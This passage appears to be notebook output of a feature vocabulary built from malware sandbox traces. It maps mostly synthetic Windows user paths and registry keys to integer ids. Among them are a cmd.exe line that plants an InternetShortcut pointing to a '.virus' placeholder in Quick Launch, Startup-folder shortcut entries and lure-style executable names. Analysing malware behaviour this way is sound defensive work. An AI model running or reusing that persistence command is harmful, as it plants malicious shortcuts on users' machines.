       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\settings\\\\.git': 137,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\\\\LocalState\\\\*': 138,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\AC\\\\*': 139,\n",
       " 'cmd.exe /C echo [InternetShortcut] > %temp%\\\\C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Roaming\\\\Microsoft\\\\Internet Explorer\\\\Quick Launch\\\\Microsoft Edge.lnk.url && echo URL=4e1ca94cdfbdc18a65391dd3ee9c81c0.virus >> %temp%\\\\C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Roaming\\\\Microsoft\\\\Internet Explorer\\\\Quick Launch\\\\Microsoft Edge.lnk.url': 140,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsStore_8wekyb3d8bbwe\\\\SystemAppData': 141,\n",
       " 'C:\\\\Users\\\\townsendsylvia\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\el\\\\*': 142,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.6_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 143,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.549981C3F5F10_8wekyb3d8bbwe\\\\LocalCache\\\\*': 144,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\tr': 145,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Roaming\\\\Adobe\\\\*': 146,\n",
       " 'C:\\\\Users\\\\adamslydia\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\Win10-PAN-FW\\\\*': 147,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 148,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebpImageExtension_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 149,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\*': 150,\n",
       " 'C:\\\\Users\\\\steven78\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\TempState': 151,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Getstarted_8wekyb3d8bbwe\\\\LocalCache': 152,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\.git': 153,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\lt': 154,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\TempState\\\\*': 155,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\TokenBroker\\\\*': 156,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.LockApp_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\.git': 157,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Xbox.TCUI_8wekyb3d8bbwe\\\\LocalState\\\\.git': 158,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\pt_BR\\\\.git': 159,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Packages\\\\1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy\\\\Settings\\\\*': 160,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\hr-BA': 161,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup': 162,\n",
       " 'C:\\\\Users\\\\gfields\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\af\\\\*': 163,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\AC\\\\Temp': 164,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\TargetedContentCache\\\\v3\\\\88000161\\\\*': 165,\n",
       " 'C:\\\\Users\\\\kathrynhall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Office.OneNote_8wekyb3d8bbwe\\\\AC\\\\*': 166,\n",
       " 'C:\\\\Users\\\\christopher63\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Session Storage': 167,\n",
       " 'C:\\\\Users\\\\evan17\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\Win10-PAN-FW\\\\scripts': 168,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.1.7_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 169,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Packages\\\\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\\\\AppData\\\\*': 170,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Libraries\\\\.git': 171,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\LocalLow\\\\Microsoft\\\\CryptnetUrlCache': 172,\n",
       " 'C:\\\\Users\\\\jenniferbaxter\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VCLibs.140.00.UWPDesktop_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 173,\n",
       " 'C:\\\\Users\\\\carlos72\\\\AppData\\\\Local\\\\Temp\\\\C:\\\\Users\\\\user\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\WINN.lnk.url:Zone.Identifier': 174,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe\\\\AC\\\\*': 175,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\sk\\\\*': 176,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\te': 177,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalCache\\\\.git': 178,\n",
       " 'C:\\\\Users\\\\edward89\\\\AppData\\\\Local\\\\Temp\\\\C:\\\\Users\\\\user\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\Software Protection Service.lnk.url:Zone.Identifier': 179,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\TargetedContentCache\\\\v3\\\\88000163': 180,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxIdentityProvider_8wekyb3d8bbwe\\\\RoamingState\\\\*': 181,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\vi\\\\*': 182,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\LocalFiles\\\\637680406057830000\\\\2': 183,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\en_US\\\\.git': 184,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Office.OneNote_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 185,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Packages\\\\*': 186,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\fi\\\\*': 187,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\mn\\\\*': 188,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Microsoft3DViewer_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 189,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Microsoft3DViewer_8wekyb3d8bbwe\\\\LocalState\\\\.git': 190,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Snapshots\\\\93.0.961.52\\\\*': 191,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\AC\\\\*': 192,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\\\\AC\\\\INetCookies': 193,\n",
       " 'C:\\\\Users\\\\crosschristine\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\Virtualized\\\\.git': 194,\n",
       " 'C:\\\\Users\\\\fgarrison\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\cs\\\\.git': 195,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\LocalLow\\\\Microsoft\\\\CryptnetUrlCache\\\\MetaData\\\\.git': 196,\n",
       " 'C:\\\\Users\\\\kyle74\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.CredDialogHost_cw5n1h2txyewy\\\\LocalCache': 197,\n",
       " 'HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{AE50C081-EBD2-438A-8655-8A092E34987A}\\\\Description': 198,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\*': 199,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\\\\SystemAppData\\\\*': 200,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\pt-BR\\\\*': 201,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\ro\\\\.git': 202,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\RoamingState': 203,\n",
       " 'pdfembargodiangovcodeudapendientereferenciamora.exe': 204,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\AppData\\\\.git': 205,\n",
       " 'Confirmacion Transfer.exe': 206,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCalculator_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 207,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\TempState\\\\.git': 208,\n",
       " 'C:\\\\Users\\\\barnescindy\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\images\\\\.git': 209,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe\\\\SystemAppData': 210,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\\\Settings': 211,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.CapturePicker_cw5n1h2txyewy\\\\AppData\\\\*': 212,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\ShaderCache\\\\GPUCache': 213,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\ContentManagementSDK\\\\Creatives\\\\280811': 214,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\ESE\\\\.git': 215,\n",
       " 'C:\\\\Users\\\\bmoore\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\logs\\\\.git': 216,\n",
       " 'C:\\\\Users\\\\alisonhaynes\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\\\\AC\\\\Microsoft': 217,\n",
       " 'C:\\\\Users\\\\nsilva\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\.git': 218,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\AppData\\\\*': 219,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\ta\\\\.git': 220,\n",
       " 'C:\\\\Users\\\\wyatt69\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe\\\\TempState\\\\*': 221,\n",
       " 'C:\\\\Users\\\\bmoore\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\af\\\\*': 222,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Session Storage': 223,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxIdentityProvider_8wekyb3d8bbwe\\\\RoamingState\\\\*': 224,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Local\\\\Packages\\\\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\\\\TempState\\\\.git': 225,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy\\\\LocalState\\\\*': 226,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Microsoft3DViewer_8wekyb3d8bbwe\\\\Settings\\\\*': 227,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\hyphen-data\\\\101.0.4906.0\\\\_metadata\\\\.git': 228,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\platforms\\\\.git': 229,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\Settings': 230,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\fr-CM\\\\.git': 231,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\\\RoamingState\\\\*': 232,\n",
       " 'C:\\\\Users\\\\brian88\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 233,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.SkypeApp_kzf8qxf38zg5c\\\\LocalCache\\\\Local': 234,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\zh_TW\\\\*': 235,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\no': 236,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\sv\\\\.git': 237,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\\\\Settings': 238,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\TempState\\\\*': 239,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\sk\\\\.git': 240,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Win32WebViewHost_cw5n1h2txyewy\\\\SystemAppData\\\\.git': 241,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Win32WebViewHost_cw5n1h2txyewy\\\\Settings\\\\*': 242,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\it\\\\*': 243,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\kk': 244,\n",
       " 'C:\\\\Users\\\\bmoore\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-SV\\\\.git': 245,\n",
       " 'C:\\\\Users\\\\perezkenneth\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extension Scripts': 246,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\ca\\\\*': 247,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\et': 248,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\eu\\\\.git': 249,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\\\\LocalState\\\\.git': 250,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BioEnrollment_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\*': 251,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy\\\\RoamingState': 252,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{f3ce0f7c-4901-4acc-8648-d5d44b04ef8f}\\\\StreamResourceType': 253,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\configs\\\\nxlog\\\\*': 254,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\RoamingState\\\\.git': 255,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\ListSync\\\\Business1\\\\*': 256,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\Settings': 257,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\qml\\\\QtQuick\\\\Templates.2\\\\.git': 258,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\kn\\\\.git': 259,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxIdentityProvider_8wekyb3d8bbwe\\\\AppData': 260,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\CapabilityAccessManager\\\\ConsentStore\\\\microphone\\\\NonPackaged\\\\348f2713fba8f0543600bf38c8427eb9996769654987516e3f0202f7bcf17228.sample\\\\LastUsedTimeStart': 261,\n",
       " 'C:\\\\Users\\\\nsilva\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\images\\\\.git': 262,\n",
       " 'C:\\\\Users\\\\evan17\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Sync Data': 263,\n",
       " 'C:\\\\Users\\\\nsilva\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\SystemAppData\\\\.git': 264,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\ContentManagementSDK\\\\Creatives\\\\onesettings_waas_featuremanagement\\\\*': 265,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\EdgeCoupons': 266,\n",
       " 'C:\\\\Users\\\\inguyen\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-CR': 267,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\pt_PT\\\\*': 268,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\it': 269,\n",
       " 'C:\\\\Users\\\\jorgeterry\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebpImageExtension_8wekyb3d8bbwe\\\\Settings': 270,\n",
       " 'C:\\\\Users\\\\christopher63\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebpImageExtension_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 271,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extension Scripts\\\\.git': 272,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Packages\\\\Windows.PrintDialog_cw5n1h2txyewy\\\\AC\\\\Temp': 273,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Framework.2.2_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 274,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 275,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\FirstPartySetsPreloaded\\\\*': 276,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\af\\\\.git': 277,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 278,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Crowd Deny\\\\*': 279,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\.git': 280,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\LocalCache\\\\*': 281,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Publishers\\\\8wekyb3d8bbwe\\\\Fonts': 282,\n",
       " 'C:\\\\Users\\\\brian88\\\\AppData\\\\Local\\\\OneDrive\\\\cache\\\\*': 283,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\BackgroundTransferApiGroup\\\\.git': 284,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\SystemAppData\\\\.git': 285,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 286,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VCLibs.140.00.UWPDesktop_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 287,\n",
